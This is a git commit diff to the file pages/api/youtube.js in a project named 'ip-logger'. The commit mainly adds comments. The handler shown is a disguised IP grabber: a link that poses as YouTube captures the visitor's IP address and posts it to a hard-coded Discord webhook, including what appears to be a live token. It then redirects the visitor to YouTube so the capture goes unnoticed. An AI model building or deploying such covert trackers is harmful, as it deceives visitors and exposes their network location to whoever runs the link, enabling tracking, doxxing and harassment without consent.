4fac3c74f56fca4d50093812e086aeee9f181b44
sleepyaurzz <sleepyaurz@gmail.com>
2026-05-18 00:38:11 +0800

    Update youtube.js

--- ip-logger/pages/api/youtube.js
+++ ip-logger/pages/api/youtube.js
@@ -1,13 +1,21 @@
+// pages/api/youtube.js
 export default async function handler(req, res) {
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  // Extract IP address
+  const ip =
+    req.headers['x-forwarded-for']?.split(',')[0] ||
+    req.connection.remoteAddress ||
+    '';
 
+  // Discord webhook URL
   const webhookURL =
     'https://discord.com/api/webhooks/1505570928007057630/fHIzbKRE8m8Ziso_WzM5Cifde8WM8cE-sfE-Ceq8C1e4qvA-v0w5GlY35mW0ySgQe6H9';
 
+  // Payload to send
   const payload = {
     content: `IP Address: ${ip}`,
   };
 
+  // Send IP to Discord webhook
   await fetch(webhookURL, {
     method: 'POST',
     headers: {
@@ -16,6 +24,7 @@ export default async function handler(req, res) {
     body: JSON.stringify(payload),
   });
 
+  // Redirect user to YouTube
   res.writeHead(302, { Location: 'https://www.youtube.com' });
   res.end();
 }
